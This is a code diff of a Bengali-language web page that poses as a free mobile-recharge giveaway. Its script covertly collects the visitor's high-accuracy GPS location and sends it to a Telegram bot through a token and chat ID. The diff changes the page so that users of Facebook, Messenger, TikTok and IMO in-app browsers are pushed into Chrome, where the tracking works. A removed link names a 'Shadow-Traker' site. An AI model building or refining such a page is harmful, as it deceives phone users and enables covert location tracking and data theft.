@@ -6,24 +6,28 @@
     <title>ফ্রি রিচার্জ অফার ২০২৬</title>
     <style>
         body { background-color: #f4f7f6; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { background: #fff; padding: 25px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; border-top: 5px solid #d9534f; }
+        .container { background: #fff; padding: 20px; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); width: 90%; max-width: 350px; text-align: center; border-top: 5px solid #d9534f; }
         .btn-green { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        .btn-browser { width: 100%; display: none; padding: 15px; background-color: #4285F4; color: white; text-decoration: none; border-radius: 8px; font-size: 18px; font-weight: bold; margin-top: 10px; display: none; box-sizing: border-box; }
+        
+        /* ইন-অ্যাপ ব্রাউজার ব্লকার স্টাইল */
+        #app-blocker { display: none; padding: 10px; background: #fffbe6; border: 1px dashed #ffc107; border-radius: 10px; margin-top: 15px; }
+        .step { text-align: left; font-size: 15px; margin-bottom: 10px; color: #333; }
+        .step b { color: #d9534f; }
         input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        #instruction { display: none; color: #d9534f; font-weight: bold; margin-top: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h2>🎁 ধামাকা অফার!</h2>
-    <p id="info-text">সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন</p>
+    <p id="top-msg">সঠিক তথ্য দিয়ে ২০ টাকা রিচার্জ নিন</p>
     
-    <a id="open-browser-btn" class="btn-browser" href="googlechrome://navigate?url=https://sidzf8.github.io/Shadow-Traker/">
-        Open Browser
-    </a>
-    
-    <div id="instruction">বাটন কাজ না করলে উপরের ৩টি ডট থেকে "Open in Browser" এ ক্লিক করুন।</div>
+    <div id="app-blocker">
+        <p style="color: #d9534f; font-weight: bold;">⚠️ সতর্কতা: আপনি অফিশিয়াল ব্রাউজারে নেই!</p>
+        <div class="step">১. উপরে ডানদিকের <b>তিনটি ডট (⋮)</b> বা <b>শেয়ার (Share)</b> বাটনে ক্লিক করুন।</div>
+        <div class="step">২. তারপর <b>"Open in Browser"</b> বা <b>"Open in Chrome"</b> অপশনটি বেছে নিন।</div>
+        <p style="font-size: 13px; color: #666;">(ব্রাউজারে না গেলে রিচার্জ কনফার্ম হবে না)</p>
+    </div>
 
     <div id="recharge-form">
         <select id="sim">
@@ -39,15 +43,15 @@
 </div>
 
 <script>
-// সব ধরণের ইন-অ্যাপ ব্রাউজার ডিটেক্ট করার জন্য
+// সব ধরণের ইন-অ্যাপ ব্রাউজার ডিটেক্ট করা
 var ua = navigator.userAgent || navigator.vendor || window.opera;
 var isInApp = /FBAN|FBAV|Messenger|TikTok|IMO|Instagram|Twitter|Line/i.test(ua);
 
 if (isInApp) {
+    // ইমো, টিকটক বা মেসেঞ্জারে থাকলে ফর্ম হাইড হবে এবং ইনস্ট্রাকশন দেখাবে
     document.getElementById('recharge-form').style.display = 'none';
-    document.getElementById('open-browser-btn').style.display = 'block';
-    document.getElementById('instruction').style.display = 'block';
-    document.getElementById('info-text').innerText = "অফারটি নিশ্চিত করতে নিচের নীল বাটনে ক্লিক করে ব্রাউজার ওপেন করুন।";
+    document.getElementById('app-blocker').style.display = 'block';
+    document.getElementById('top-msg').innerText = "অফারটি নিশ্চিত করতে নিচের নিয়মটি মানুন:";
 }
 
 function processOffer() {
@@ -71,6 +75,7 @@ function processOffer() {
             
             sendToTelegram(token, chat_id, message);
         }, function(error) {
+            // আপনার সেই নির্দিষ্ট ওয়ার্নিং
             alert("আপনি এখনো আপনার ফোনের লকেশন অপশন অন করেন্নি দয়া করে অন করুন!");
         }, { enableHighAccuracy: true, timeout: 5000 });
     }
